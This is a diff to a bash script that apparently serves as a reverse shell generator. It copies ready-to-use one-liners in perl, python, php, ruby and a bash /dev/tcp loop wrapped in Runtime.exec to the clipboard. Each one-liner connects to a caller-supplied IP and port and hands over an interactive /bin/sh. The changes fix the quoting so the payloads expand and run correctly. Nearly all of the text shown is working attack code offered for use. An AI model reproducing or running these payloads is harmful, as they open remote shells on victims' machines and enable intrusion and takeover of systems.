@@ -30,19 +30,19 @@ process () {
                        echo "[*] Reverse shell copied to clipboard"
                    elif [ "$1" = "perl" ]
                    then
-                       echo "perl -e 'use Socket;$i='$2';$p=$3;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};'" | xclip -selection clipboard
+                       echo "perl -e 'use Socket;\$i=\"$2\";\$p=$3;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" | xclip -selection clipboard
                        echo "[*] Reverse shell copied to clipboard"
                    elif [ "$1" = "python" ]
                    then
-                       echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$2',$3));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);'" | xclip -selection clipboard
+                       echo "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$2',$3));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"" | xclip -selection clipboard
                        echo "[*] Reverse shell copied to clipboard"
                    elif [ "$1" = "php" ]
                    then
-                       echo "php -r '$sock=fsockopen('$2',$3);exec('/bin/sh -i <&3 >&3 2>&3');'" | xclip -selection clipboard
+                       echo "php -r '$sock=fsockopen(\"$2\",$3);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | xclip -selection clipboard
                        echo "[*] Reverse shell copied to clipboard"
                    elif [ "$1" = "ruby" ]
                    then
-                       echo "ruby -rsocket -e'f=TCPSocket.open('$2',$3).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)'" | xclip -selection clipboard
+                       echo "ruby -rsocket -e'f=TCPSocket.open(\"$2\",$3).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" | xclip -selection clipboard
                        echo "[*] Reverse shell copied to clipboard"
                    elif [ "$1" = "nc" ]
                    then
@@ -50,7 +50,7 @@ process () {
                        echo "[*] Reverse shell copied to clipboard"
                    elif [ "$1" = "java" ]
                    then
-                       echo "r = Runtime.getRuntime() p = r.exec(['/bin/bash','-c','exec 5<>/dev/tcp/$2/$3;cat <&5 | while read line; do \$line 2>&5 >&5; done'] as String[]) p.waitFor()" | xclip -selection clipboard
+                       echo "r = Runtime.getRuntime() p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$2/$3;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]) p.waitFor()" | xclip -selection clipboard
                        echo "[*] Reverse shell copied to clipboard"
                    fi
                 else
@@ -92,6 +92,5 @@ check_perm () {
 }
 
 check_xclip $1 $2 $3
-
 
 
